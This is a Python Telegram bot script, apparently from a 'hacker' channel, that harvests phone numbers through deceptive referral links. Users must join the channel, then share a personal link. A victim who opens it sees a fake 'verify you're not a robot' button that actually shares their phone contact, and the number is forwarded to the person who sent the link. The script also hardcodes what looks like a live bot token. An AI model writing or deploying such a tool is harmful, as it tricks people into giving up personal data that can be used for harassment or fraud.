from telebot import TeleBot, types
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)

# ==========================
# CONFIG
# ==========================
BOT_TOKEN = "8228675667:AAFo5Pgd2_ki15xRPJjAhwdmp3HpqQmTH7Q"   # <<< YOUR BOT TOKEN
CHANNEL_USERNAME = "@The_ProHackerXyz"   # <<< YOUR CHANNEL

bot = TeleBot(BOT_TOKEN)

# store referrers
referrer = {}


# ==========================
# CHECK CHANNEL JOIN
# ==========================
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False


# ==========================
# /start HANDLER
# ==========================
@bot.message_handler(commands=['start'])
def start_handler(message):
    chat_id = message.chat.id
    text = message.text or ""
    args = text.split()

    # -------------------------------------
    # 1) NORMAL /start
    # -------------------------------------
    if len(args) == 1:

        # Check if user joined channel
        try:
            joined = is_user_in_channel(chat_id)
        except:
            joined = False

        if not joined:
            join_btn = InlineKeyboardMarkup()
            clean = CHANNEL_USERNAME.replace("@", "")

            join_btn.add(
                InlineKeyboardButton(
                    "Join Channel 🔗", url=f"https://t.me/{clean}"
                )
            )
            join_btn.add(
                InlineKeyboardButton("I Joined ✔", callback_data="check_join")
            )

            bot.send_message(
                chat_id,
                "🚦 To use this bot, please join our Telegram channel first!",
                reply_markup=join_btn
            )
            return

        # Already joined → send referral link
        bot.send_message(
            chat_id,
            "The bot can collect a user’s phone number only if they share it themselves and they have Telegram installed."
        )

        encoded_id = f"free_{chat_id}"

        try:
            bot_username = bot.get_me().username
            referral_link = f"https://t.me/{bot_username}?start={encoded_id}"
        except:
            referral_link = encoded_id

        bot.send_message(
            chat_id,
            f"Your personal link:\n\n{referral_link}\n\nShare this link with someone. When they open it and share their phone number, you will receive it here."
        )
        return

    # -------------------------------------
    # 2) REFERRAL USER — clicked the link
    # -------------------------------------
    if len(args) > 1:
        param = args[1]

        if param.startswith("free_"):
            inviter = param.replace("free_", "")

            try:
                inviter = int(inviter)
                referrer[chat_id] = inviter
            except:
                referrer[chat_id] = inviter

            markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            btn = KeyboardButton("Verify", request_contact=True)
            markup.add(btn)

            bot.send_message(
                chat_id,
                "🚦 For Security Reasons, please verify you're not a robot 💚",
                reply_markup=markup
            )
            return


# ==========================
# CALLBACK HANDLER (I Joined ✔)
# ==========================
@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join(call):
    user_id = call.from_user.id

    try:
        joined = is_user_in_channel(user_id)
    except:
        joined = False

    if not joined:
        bot.answer_callback_query(call.id, "❌ You still haven't joined the channel.")
        return

    bot.answer_callback_query(call.id, "✅ Verified!")
    bot.send_message(
        user_id,
        "🎉 Verification complete! Send /start again to continue."
    )


# ==========================
# CONTACT HANDLER
# ==========================
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    chat_id = message.chat.id
    phone = message.contact.phone_number

  #  bot.send_message(chat_id, f"📞 Your phone number: {phone}")

    # if someone referred this user → send phone to referrer
    if chat_id in referrer:
        try:
            bot.send_message(
                referrer[chat_id],
                f"📥 Phone number received:\n\n{phone}"
            )
        except:
            pass


# ==========================
# START BOT
# ==========================
bot.polling(none_stop=True)
